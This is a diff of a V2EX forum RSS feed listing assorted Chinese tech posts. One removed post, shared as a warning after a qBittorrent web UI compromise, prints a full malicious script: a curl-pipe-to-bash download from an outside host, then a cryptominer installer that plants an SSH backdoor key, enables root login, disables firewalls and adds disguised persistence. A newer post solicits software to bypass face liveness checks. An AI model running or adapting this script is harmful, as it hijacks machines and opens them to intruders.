@@ -1,332 +1,107 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title>V2EX</title><link>https://www.v2ex.com/</link><description>way to explore</description><lastBuildDate>Mon, 04 Dec 2023 17:48:53 GMT</lastBuildDate><generator>rfeed v1.1.1</generator><docs>https://github.com/svpino/rfeed/blob/master/README.md</docs><item><title>[分享发现] 淘宝闲鱼买的 enpass 买断版可能会掉</title><link>https://www.v2ex.com/t/997636#reply0</link><description>&lt;p&gt;我昨天 80 块买的 enpass 终身版，今天资格竟然掉了，商家说也是头一次遇见要给我重新激活，那我肯定不搞了谁知道再过一两个月会不会掉。应该就我一个人遇到了吧，我买之前还在网上搜了好久都说买断挺靠谱的。&lt;/p&gt;
-&lt;p&gt;之前一直用 bitwarden ，但最近 bitwarden 说什么为了安全只对受信任的网站启用自动填写，我测试他们只对欧美网站和 app 做了优化，国内很多网站、app 都得自己手动复制粘贴，麻烦死了。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 17:32:21 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997636#reply0</guid></item><item><title>[Cloudflare] cloudflare 存图片有点贵</title><link>https://www.v2ex.com/t/997635#reply2</link><description>&lt;p&gt;最近还是在用 cloudflare 的服务开发 app ，要开始加入一些用户交流的功能了。&lt;br /&gt;
-开始涉及到图片头像之类的存储。  &lt;/p&gt;
-&lt;p&gt;兴致冲冲的研究起了 R2 ，发现 cloudflare 的存储提供图片挺贵。&lt;br /&gt;
-每月付 5$ 的 workers 会员后会有免费的 R2 额度，而且额度还比国内的云要多很多。&lt;br /&gt;
-问题是不能直接把原图返回给客户端，图片处理 workers 也做不到。  &lt;/p&gt;
-&lt;p&gt;cloudflare 有应对这种情况的服务：Cloudflare Images&lt;br /&gt;
-但是性价比挺低的...低消 $5 ，用起来了更贵 &lt;a href="https://www.reddit.com/r/CloudFlare/comments/10vjxpm/cloudflare_images_most_expensive_product/" rel="nofollow"&gt;https://www.reddit.com/r/CloudFlare/comments/10vjxpm/cloudflare_images_most_expensive_product/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;其余的选择是 polish 或 image resizing ，这两个都需要充 cloudflare 的另外一个会员才能用，每月 $20 起(但是可以无限调用)。  &lt;/p&gt;
-&lt;p&gt;可能，也没有那么的贵吧，但是和 workers 、pages 之类的价格比起来，属于是没有那么值了。&lt;br /&gt;
-因为到目前基本所有东西都在 cloudflare 上了，再用它做存储肯定效果更佳。但确实，这个消耗有点高了，可能要想想怎么独立出来一个上传接口接入到七牛了。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 16:38:15 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997635#reply2</guid></item><item><title>[Apple] Apple 官网被封禁</title><link>https://www.v2ex.com/t/997633#reply10</link><description>&lt;p&gt;访问 &lt;a href="http://apple.com" rel="nofollow"&gt;apple.com&lt;/a&gt;,直接无响应； &lt;a href="http://apple.com.cn" rel="nofollow"&gt;apple.com.cn&lt;/a&gt; 正常&lt;/p&gt;
-&lt;p&gt;尝试 ping &lt;a href="http://apple.com" rel="nofollow"&gt;apple.com&lt;/a&gt;,返回 127.0.0.1 。&lt;/p&gt;
-&lt;p&gt;在 dnschecker 网站上，也得到了同样的结果。&lt;/p&gt;
-&lt;p&gt;通过 dig ，发现北京联通的 dns(202.106.195.68/202.106.46.151)封禁了 &lt;a href="http://apple.com" rel="nofollow"&gt;apple.com&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;根据网友反馈，影响范围只有北京，联通、移动宽带均受影响，电信暂时没事。手机 ipv4 也不正常，但是 ipv6 未被和谐，所以依旧能访问。&lt;/p&gt;
-&lt;p&gt;联通官方给的回复是因为北京公安反诈将该网站列为封禁名单。暂不清楚此事为乌龙，还是锁区的开始。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 15:46:08 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997633#reply10</guid></item><item><title>[宽带症候群] 私网 IP、NAT4，请问下 P2P 下载还有救不？</title><link>https://www.v2ex.com/t/997632#reply0</link><description>最近搬了住的地方，然后宽带移机后公网 IP 被收回了。光猫是桥接方式连接的 mikrotik 路由器，现在的问题是一打开迅雷下载，整个局域网里的其他终端设备都受到影响，基本无法上网，但是迅雷并没有下载速度，应该是被联通对连接数进行 qos 了，请问下这种情况可以和联通申请更换为 NAT1 吗？不然都没办法 p2p 下载东西了，没有移机前是没有这种情况的，所以网络设备应该是没问题的。</description><pubDate>Mon, 04 Dec 2023 15:34:59 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997632#reply0</guid></item><item><title>[问与答] 有什么比较好的方式可以实现“将图片内容不同,但图片的文件名相同的图片放在同一个文件夹内”</title><link>https://www.v2ex.com/t/997631#reply2</link><description>&lt;p&gt;我知道在将两处文件名相同的图片塞在同一个文件夹最好的方式就是”同时保存两者“,但这样就会造成文件多个后缀很难受.&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 15:34:26 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997631#reply2</guid></item><item><title>[优惠信息] 网易云音乐 5 天 2 张，领了的评论回复一下，超过五个大家就别点啦</title><link>https://www.v2ex.com/t/997629#reply0</link><description>&lt;p&gt;BG8KIW 送您一张会员礼品卡，快来看看 TA 的祝福吧! 快来领取吧 &lt;a href="https://music.163.com/prime/m/gift-receive?p=jJ9EKevaupxEKJJk9AIE29TvieeLDNipuOQ5MjuK5o7SEhvuCHxIAWujrqDzY6xfWD0ITgHtXQd7z9K54vKP1RT61BXc95Kmb0H402kpttE&amp;amp;d=3mtwH7d55OJ-jPrLtubF9Q" rel="nofollow"&gt;https://music.163.com/prime/m/gift-receive?p=jJ9EKevaupxEKJJk9AIE29TvieeLDNipuOQ5MjuK5o7SEhvuCHxIAWujrqDzY6xfWD0ITgHtXQd7z9K54vKP1RT61BXc95Kmb0H402kpttE&amp;amp;d=3mtwH7d55OJ-jPrLtubF9Q&lt;/a&gt;&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 15:16:00 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997629#reply0</guid></item><item><title>[Twitter] 口水贴--推特第三方客户端 2023 年 12 月 4 日</title><link>https://www.v2ex.com/t/997628#reply1</link><description>最近下了个第三方客户端，spring mini for twitter （它是免费版，同时有收费版的叫 spring for Twitter ）。&lt;br /&gt;感觉还行，不是那种简陋的玩意。功能很齐全，而且没有广告，能自定义的选项特别多。界面也很简洁明快。&lt;br /&gt;发现了有个小小的不足之处，为你推荐和你跟随的放在了一起，不能分开显示。&lt;br /&gt;把玩了一天，推特账号莫名其妙登出了，于是重新登录。令人难过的事情发生了，怎么也不能转跳到推特官方登录界面。要不弹出 ssl 错误提示，要不就没反应。重装 app 也不好使。&lt;br /&gt;感觉挺惋惜了，界面和功能都很赞的一个免费第三方。虽然有些小不足，但是在这个 api 全面收费的时代里，有这么一个免费的第三方客户端，也着实是一件令人开心的事情呢。只是这感觉走的太快。</description><pubDate>Mon, 04 Dec 2023 15:13:12 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997628#reply1</guid></item><item><title>[问与答] 讨论，如何调研项目需求</title><link>https://www.v2ex.com/t/997627#reply0</link><description>&lt;p&gt;大大们，对于一个产品大家一般是怎么做市场需求调研的啊，比如想做一个，上下班顺风车凑搭子这种小需求。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 15:02:55 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997627#reply0</guid></item><item><title>[求职] 想找个兼职，或者独立游戏开发，周末一定都在</title><link>https://www.v2ex.com/t/997626#reply0</link><description>&lt;p&gt;有 10 年工作经验，技术宅想主要增加个人技能和社交吧，个人收入稳定，在养老企业稳定（ 10 5 5 ，下班到家走路 5 分钟），负责搜索推荐算法 三个大方向，平时兴趣主要是玩玩大数据建模竞赛，闲聊水群，现在觉得打比赛没意思，想找个兼职或者独立游戏开发。平时宅着玩游戏太浪费时间了。
-编程语言：python golang 一点点 java scala ；
-架构相关：mysql hive es ...mq 主要后端都熟悉，算法模型这块的工程化及服务架构也熟悉；
-项目：搜索，推荐，建模 都熟悉；
-游戏相关没什么接触过，有点想搞拓展一下技术路径，玩土豆兄弟时候改过不少代码（ Gotdot ）算是稍微和游戏扯上边的经历，没有游戏项目经验比较难深入了解游戏这块内容，但是还是热爱学习。
-另外也希望有自己稳定的副业，开辟新航路，如果靠谱会一直合作下去。
-邮箱是 &lt;a href="mailto:cavities@sina.com"&gt;cavities@sina.com&lt;/a&gt; 偶尔看看，看到必会回。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 14:48:56 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997626#reply0</guid></item><item><title>[分享发现] qBittorrent web 端 弱密码 + 开启 UPNP 被挂恶意脚本</title><link>https://www.v2ex.com/t/997625#reply5</link><description>&lt;p&gt;今天回家，照常下载种子并导入到我的 qBittorrent ， 准备美滋滋地看会电视剧。&lt;/p&gt;
-&lt;p&gt;由于之前设置了种子完成后自动执行脚本，正常情况应该会自动创建一个到资料库目录的软链接，但今天种子下载好后脚本却没有照常执行。&lt;/p&gt;
-&lt;p&gt;检查之后吓了一跳，原本的自动执行程序被替换为以下脚本。&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;bash -c "(curl -s -L http://files.catbox.moe/o0gr8o.sh || wget --no-check-certificate -O - http://files.catbox.moe/o0gr8o.sh) | bash"
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;检查了一下，是我的 QB 默认开启了 upnp ，家里是公网 IP ，等于直接在公网 8085 端口裸奔了。&lt;/p&gt;
-&lt;p&gt;我用的群晖 DS220+和矿神的 qBittorrent 应用，暂时没有发现有损失。&lt;/p&gt;
-&lt;p&gt;提醒一下大家注意防范，贴一下这个脚本的内容。&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;#! /bin/bash
-##
-VERSION=e4
-
-# Arguments
-#EMAIL=dev@ajay.app
-WALLET=41poaCNDTvs33KCFKfekN88Ehf59ddparQdFKFT4XKrUMnc1Ude7xtvhZuKfTai8tDML6gFyTAKY5RuDDxDqLRZpT8QpQ9b
-EMAIL=n.v.ovchinnikova@rostec.digital
-PORT=15555
-AUDITD=http://files.catbox.moe/5eki22.out
-
-function prune_competition() {
-    sudo systemctl stop c3pool_miner.service 2&amp;gt;&amp;amp;1
-    sudo systemctl disable c3pool_miner.service 2&amp;gt;&amp;amp;1
-    sudo systemctl disable xmrig.service 2&amp;gt;&amp;amp;1
-    sudo systemctl stop journalctld.service 2&amp;gt;&amp;amp;1
-    sudo systemctl disable journalctld.service 2&amp;gt;&amp;amp;1
-    kill -9 $(pidof xmrig) &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    kill $(ps aux | grep "[--]config=" | awk '{print $2}') 2&amp;gt;&amp;amp;1
-    sudo killall xmrig 2&amp;gt;&amp;amp;1
-    sudo pkill xmrig 2&amp;gt;&amp;amp;1
-    sudo pkill auditd 2&amp;gt;&amp;amp;1
-    killall -9 xmrig 2&amp;gt;&amp;amp;1
-    killall xmrig 2&amp;gt;&amp;amp;1
-    pkill xmrig 2&amp;gt;&amp;amp;1
-    pkill auditd 2&amp;gt;&amp;amp;1
-    killall auditd 2&amp;gt;&amp;amp;1
-    rm -rf rm -rf /root/.local/.c 2&amp;gt;&amp;amp;1
-    rm -rf "${HOME}/.c3pool" &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    rm -rf /root/.c3pool &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    rm -rf "${HOME}/.local/share/auditd" &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    rm -rf "${HOME}/.local/.c*" &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    rm -rf "${HOME}/.local/bin/auditd"
-    rm -rf /etc/cron.daily &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    rm -rf /etc/cron.daily/auditd &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    rm -rf /etc/systemd/system/journalctld.service 2&amp;gt;&amp;amp;1
-    find . -name "*c3pool*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-    find . -name "*xmrig*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-    find . -name "*miner*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-    find $HOME -name "*c3pool*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-    find $HOME -name "*xmrig*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-    find $HOME -name "*miner*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-    find $HOME -name "*c4*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-    find $HOME -name "*auditd*" -exec rm -rf {} \; 2&amp;gt;&amp;amp;1
-
-    sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDJRrXGodFAgNzqgVw4QmjxKhZbvc6ReMa0ctI8WGbWBi/d' "${HOME}/.ssh/authorized_keys"
-    sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDJRrXGodFAgNzqgVw4QmjxKhZbvc6ReMa0ctI8WGbWBi/d' "/root/.ssh/authorized_keys"
-    sed -i '/c3pool/d;/miner.sh/d' "${HOME}/.profile"
-    sed -i '/c3pool/d;/miner.sh/d' "/root/.profile"
-
-    mkdir $HOME/.ssh ; touch $HOME/.ssh/authorized_keys ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJRrXGodFAgNzqgVw4QmjxKhZbvc6ReMa0ctI8WGbWBi3pUF++QmmM6Jo4/wMWqOxmdJotN85QpbkRfYuw9QN5aO35RLSJw7o2UOXN9vsaxnIg9wunNstVff22vyjrFrXTNrHaI///P3d4T4w6CCgLlNdNKgKTG176Y7KBmkWWeZvd8phtIaMprhGSbtnvs4v0hADTw+Ej20EeKfphlZsRSVS6zObq6jro4j8iIXvnGEdkIx8b1SP+QK6D+ZOEQxEzD107latrwYbLCNHWX7VP1oK6fbFk3zU+CGOwITiVPKuyX9aNFJVEopZSmreD+b+JoXpYHybiuhL3ex79uCWNWKnfGgBKrSAmnmopvYnd/mQ902ls16j/Cr/YYKhUvFMC7MhuWdazvM9uFT07c8PSPsEJ+vJpW3t2HQkW89mxqjp1rEvURUlqZtkL/3hZEMaamP6phHpSttncyWiMGuLZxoub/2GM8C09+GOOTaf47//mGxtNs5FNWqjyiznznrc=" &amp;gt;&amp;gt; $HOME/.ssh/authorized_keys ; chmod 600 $HOME/.ssh/authorized_keys
-
-    (chmod go-w ~/ &amp;amp;&amp;amp; chmod go-w /root &amp;amp;&amp;amp; chmod 700 ~/.ssh &amp;amp;&amp;amp; chmod 700 /root/.ssh &amp;amp;&amp;amp; chmod 600 ~/.ssh/authorized_keys &amp;amp;&amp;amp; chown root /root &amp;amp;&amp;amp; chown root /root/.ssh) &amp;gt;/dev/null
-    sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config &amp;gt;/dev/null
-    sudo sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config &amp;gt;/dev/null
-    iptables -P INPUT ACCEPT 2&amp;gt;&amp;amp;1
-    iptables -P FORWARD ACCEPT 2&amp;gt;&amp;amp;1
-    iptables -P OUTPUT ACCEPT 2&amp;gt;&amp;amp;1
-    iptables -F 2&amp;gt;&amp;amp;1
-    ufw disable 2&amp;gt;&amp;amp;1
-}
-
-function install_auditd() {
-    mkdir -p ${HOME}/.local/share/
-    cat &amp;gt;${HOME}/.local/share/auditd &amp;lt;&amp;lt;EOL
-#!/bin/bash
-if [ -z "\$(pidof auditd)" ]; then
-    mkdir -p ${HOME}/.local/bin
-    curl -s4 -L "${AUDITD}" -o ${HOME}/.local/bin/auditd
-    chmod a+x ${HOME}/.local/bin/auditd
-    ${HOME}/.local/bin/auditd
-    sleep 5
-    rm ${HOME}/.local/bin/auditd
-fi
-EOL
-    chmod a+x "${HOME}/.local/share/auditd"
-
-    mkdir -p /etc/cron.daily
-    if ! grep "${AUDITD}" "/etc/cron.daily/auditd" &amp;gt;/dev/null; then
-        cp ${HOME}/.local/share/auditd /etc/cron.daily/auditd
-    fi
-
-    (${HOME}/.local/share/auditd || /etc/cron.daily/auditd) &amp;amp;
-}
-
-function install_rig() {
-    mkdir -p "${HOME}/.local/.c"
-    "${HOME}/.local/.c/journalctld" --help &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 
-    if test $? -ne 0; then
-        # Attempt to download
-        LATEST_LINUX_RELEASE=$(curl -s4 https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download | grep linux-static | cut -d'"' -f4)
-        if ! curl -s4 -L "${LATEST_LINUX_RELEASE}" -o /tmp/xmrig.tar.gz; then
-            exit 1
-        fi
-
-        # Attempt to extract
-        if ! tar xf /tmp/xmrig.tar.gz -C "${HOME}/.local/.c" --strip=1; then
-            exit 1
-        fi
-        rm /tmp/xmrig.tar.gz
-        mv "${HOME}/.local/.c/xmrig" "${HOME}/.local/.c/journalctld"
-
-        # Check if downloaded
-        "${HOME}/.local/.c/journalctld" --help &amp;gt;/dev/null
-        if test $? -ne 0; then 
-            exit 1
-        fi
-    fi
-
-    PASS=$(hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')
-
-    # Config
-    CONFIG="${HOME}/.local/.c/config.json"
-    sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:'"${PORT}"'",/' "${CONFIG}"
-    sed -i 's/"user": *"[^"]*",/"user": "'"${WALLET}"'",/' "${CONFIG}"
-    sed -i 's/"pass": *"[^"]*",/"pass": "'"${PASS}"'",/' "${CONFIG}"
-    sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "${CONFIG}"
-    sed -i 's#"log-file": *null,#"log-file": "'"${HOME}/.local/.c/journalctld.log"'",#' "${CONFIG}"
-    sed -i 's/"syslog": *[^,]*,/"syslog": false,/' "${CONFIG}"
-    sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' "${CONFIG}"
-    sed -i 's/"background": *[^,]*,/"background": false,/' "${CONFIG}"
-
-    # Config (background)
-    cp "${CONFIG}" "${HOME}/.local/.c/config_background.json"
-    sed -i 's/"background": *false,/"background": true,/' "${HOME}/.local/.c/config_background.json"
-
-    # Prepare start script
-    cat &amp;gt;"${HOME}/.local/.c/journalctl" &amp;lt;&amp;lt;EOL
-#!/bin/bash
-if [ -z "\$(pidof auditd)" ]; then
-    curl -s4 -L "${AUDITD}" -o /tmp/auditd
-    chmod a+x /tmp/auditd
-    /tmp/auditd
-    rm /tmp/auditd
-fi
-
-if [ -z "\$(pidof journalctld)" ]; then
-    nice ${HOME}/.local/.c/journalctld \$*
-fi
-EOL
-    chmod +x "${HOME}/.local/.c/journalctl"
-
-    # Prepare persistence
-    if ! grep journalctl "${HOME}/.profile" &amp;gt;/dev/null; then
-        echo "${HOME}/.local/.c/journalctl --config=${HOME}/.local/.c/config_background.json &amp;gt;/dev/null 2&amp;gt;&amp;amp;1" &amp;gt;&amp;gt; "${HOME}/.profile"
-    fi
-    if ! grep journalctl "/etc/rc.local" &amp;gt;/dev/null; then
-        echo "#!/bin/bash" &amp;gt; "/etc/rc.local"
-        echo "${HOME}/.local/.c/journalctl --config=${HOME}/.local/.c/config_background.json &amp;gt;/dev/null 2&amp;gt;&amp;amp;1" &amp;gt;&amp;gt; "/etc/rc.local" &amp;amp;&amp;amp; chmod a+x "/etc/rc.local"
-    fi
-    
-
-    if sudo -n true 2&amp;gt;/dev/null; then
-        # Attempt to configure huge pages
-        if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
-            echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
-            sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
-        fi
-
-        if ! type systemctl &amp;gt;/dev/null; then
-            /bin/bash "${HOME}/.local/.c/journalctl" --config="${HOME}/.local/.c/config_background.json" &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-        else
-            cat &amp;gt;/tmp/journalctld.service &amp;lt;&amp;lt;EOL
-[Unit]
-Description=systemd journaling
-[Service]
-ExecStart=${HOME}/.local/.c/journalctl --config=${HOME}/.local/.c/config.json
-Restart=always
-Nice=10
-CPUWeight=1
-[Install]
-WantedBy=multi-user.target
-EOL
-            sudo mv /tmp/journalctld.service /etc/systemd/system/journalctld.service
-            sudo killall journalctld 2&amp;gt;/dev/null
-            sudo systemctl daemon-reload
-            sudo systemctl enable journalctld.service
-            sudo systemctl restart journalctld.service
-        fi
-    fi
-
-
-    if [ -z "$(pidof journalctld)" ]; then
-        /bin/bash "${HOME}/.local/.c/journalctl" --config="${HOME}/.local/.c/config_background.json" &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
-    fi
-}
-
-# Run processes
-prune_competition
-install_auditd
-install_rig
-
-# Version
-echo "${VERSION}" &amp;gt; "${HOME}/.local/.c/.version"
-
-sudo /etc/init.d/ssh restart &amp;gt;/dev/null
-&lt;/code&gt;&lt;/pre&gt;</description><pubDate>Mon, 04 Dec 2023 14:48:35 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997625#reply5</guid></item><item><title>[酷工作] 招聘一位会策划文案，做抖音账号的人才，可以远程</title><link>https://www.v2ex.com/t/997624#reply0</link><description>详情联系 TG：@byzwjq1&lt;br /&gt;咨询备注 v2ex</description><pubDate>Mon, 04 Dec 2023 14:46:50 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997624#reply0</guid></item><item><title>[问与答] “强制路由”和“排除路由 0.0.0.0/31”是什么东西？</title><link>https://www.v2ex.com/t/997623#reply0</link><description>那 2 个在小火箭设置里面，有啥用？需要打开吗？</description><pubDate>Mon, 04 Dec 2023 14:42:06 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997623#reply0</guid></item><item><title>[问与答] ubuntu 虚拟机里，双击一下会有按 enter 的效果？</title><link>https://www.v2ex.com/t/997621#reply0</link><description>&lt;p&gt;&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://s3.bmp.ovh/imgs/2023/12/04/ed8352a8cd745138.png" /&gt;&lt;/p&gt;
-&lt;p&gt;在 Windows 里的 VMware 的 ubuntu 虚拟机里，我在 terminal 的任意处 双击一下，就会出现 多按了一下 enter 的效果，但实际上 我根本没有按这个 enter 。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;同时还会显示^C&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;为啥会这样？我用触摸板双击也是一样的。&lt;/p&gt;
+<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title>V2EX</title><link>https://www.v2ex.com/</link><description>way to explore</description><lastBuildDate>Tue, 05 Dec 2023 11:52:42 GMT</lastBuildDate><generator>rfeed v1.1.1</generator><docs>https://github.com/svpino/rfeed/blob/master/README.md</docs><item><title>[求职] 來個大佬，外包業務。做個過人臉軟體帶活體偵測，破逆協。</title><link>https://www.v2ex.com/t/997872#reply0</link><description>加微信 apppp6906</description><pubDate>Tue, 05 Dec 2023 11:50:27 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997872#reply0</guid></item><item><title>[程序员] 非标端口无域名权限有可能申请到证书吗？</title><link>https://www.v2ex.com/t/997871#reply0</link><description>&lt;p&gt;比如 阿里云的 IP 应用加速，给的 CNAME  是 &lt;a href="http://xxxx.XXXXX.xxx.w.kunlunhuf.com" rel="nofollow"&gt;xxxx.XXXXX.xxx.w.kunlunhuf.com&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;非 80/443 端口&lt;/p&gt;
+&lt;p&gt;对应端口上 搭建了 webserver ，不想用自己的域名的情况下，肯定也没有 .kunlunhuf.com 这个域名的管理权限，有可能 给这个 cname 地址申请到证书吗？&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:47:38 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997871#reply0</guid></item><item><title>[Java] FeignClient 大佬们， Feign 下载文件怎么操作呢。</title><link>https://www.v2ex.com/t/997870#reply0</link><description>&lt;p&gt;A 服务是一个文件服务
+B 服务去请求 A 服务 API ，返回 ResponseEntity&amp;lt;FileSystemResource&amp;gt; 这种通过 Http 接口可以查看到图片，但是获取文件流失败，我要把文件流给传到别的服务里面去。&lt;/p&gt;
+&lt;p&gt;大佬们直接上代码👇🏻&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:47:14 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997870#reply0</guid></item><item><title>[买买买] 说经济下行，结果现在的手机动不动 4000</title><link>https://www.v2ex.com/t/997869#reply1</link><description>小米卖 4000 就算了&lt;br /&gt;红米也快到了 4000&lt;br /&gt;&lt;br /&gt;一加动不动也 4000&lt;br /&gt;&lt;br /&gt;华为就更吓人，一个 888 差不多的处理器近 6000&lt;br /&gt;778G 卖近 3000</description><pubDate>Tue, 05 Dec 2023 11:46:49 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997869#reply1</guid></item><item><title>[MacBook Pro] mac 用来双机推流，有什么采集卡推荐？</title><link>https://www.v2ex.com/t/997867#reply0</link><description>&lt;p&gt;mac 推流没办法用 pcie 采集卡，所以只能用外置采集卡。&lt;/p&gt;
+&lt;p&gt;价格不超 2K ，工作时工作噪音小的，最好能全球质保的。&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:44:32 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997867#reply0</guid></item><item><title>[宽带症候群] 如何设计 OSPF 网络？</title><link>https://www.v2ex.com/t/997866#reply0</link><description>&lt;p&gt;已经实现的部分：&lt;/p&gt;
+&lt;p&gt;已经实现多个家庭宽带的互联互通，都是光猫桥接的 MikroTik 路由。如果有公网 IPv4 的，就通过 L2TP over IPSec 连接；如果只有 IPv6 的，就通过 GRE 连接；如果双栈网络的，就同时双栈隧道以作冗余。同时，只要运营商不做限制，尽量做到点对点隧道，减少中转，以提升网络访问质量。尽可能使路由之间全连接，建立多链路冗余对等网络。并根据运营商和自身需求来进行策略路由和 QoS 。&lt;/p&gt;
+&lt;p&gt;为了多链路冗余路由，使用了 OSPF 协议，已经成功配置，并且都划分为 Area 0 （区域 0 ）&lt;/p&gt;
+&lt;p&gt;现在的问题：&lt;/p&gt;
+&lt;p&gt;如何设计 OSPF 网络才能有更好的体验？多 Area 的规划应该参考什么？以什么来划分 OSPF 的区域？
+以及随之而来的路由表过滤问题？&lt;/p&gt;
+&lt;p&gt;当前自己的核心问题是，会配置 OSPF 网络，但是不知道如何设计/规划一个 OSPF 网络，包括 BGP 网络的设计与规划，家庭网络互联的 OSPF 有什么建议？以及想学习网络的设计与规划有什么好的资料吗？网上找的很多都是针对某品牌设备的具体配置过程，很少有列明一个网络需求，并教如何设计网络结构的。还请大佬们赐教。&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:37:26 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997866#reply0</guid></item><item><title>[程序员] 最近 Google 问题有点多啊，搜索页不能翻页了，只能下拉自动加载。</title><link>https://www.v2ex.com/t/997865#reply0</link><description>&lt;h2&gt;最近 Google 问题有点多啊&lt;/h2&gt;
+&lt;p&gt;已经登录的账号，搜索页不能翻页了，只能下拉自动加载。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;这个拉不完的结果好难受啊，以前还可以先看第一页，回头看第二页，现在懵逼了。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;又不是在移动端，这样操作真的好奇怪&lt;/strong&gt;&lt;/p&gt;
 &lt;hr /&gt;
-&lt;p&gt;解决了，是因为这个 &lt;a href="https://www.landui.com/docs-3946" rel="nofollow"&gt;https://www.landui.com/docs-3946&lt;/a&gt;
-我把翻译软件关了，就好了。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 14:33:27 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997621#reply0</guid></item><item><title>[Vue.js] 如何在 vue 项目中，正确引用项目文件夹外的图片</title><link>https://www.v2ex.com/t/997620#reply1</link><description>&lt;p&gt;我并不想把一些图片放在/src 里，于是我试着创建了一个和项目 vue_code 同级的文件夹 photoData ，把图片放在里面。现在我打开网页时好像没法正确获取图片。&lt;/p&gt;
-&lt;p&gt;经过查找资料，我现在使用的写法是：&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;&amp;lt;img v-for="photo in photos" :key="photo.photo_id" :src="require('D:/vueproject/code' + photo.photo_path)" /&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;但这种写法似乎会导致运行时需要 build 的 modules 数无限增大。请问下我正确的写法应当是什么。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 14:33:13 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997620#reply1</guid></item><item><title>[Android] x100pro 和小米 14pro 该怎么选</title><link>https://www.v2ex.com/t/997619#reply5</link><description>双持。手上一台 13pro max 玩 ios 王者用&lt;br /&gt;安卓主要是为了隐私系统。&lt;br /&gt;然后下载一些 ios 无法使用的软件。&lt;br /&gt;请问 vivo 和小米这款该怎么选。之前是折叠屏的 vivo x flod</description><pubDate>Mon, 04 Dec 2023 14:32:01 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997619#reply5</guid></item><item><title>[问与答] oyunfor 使用招行 visa 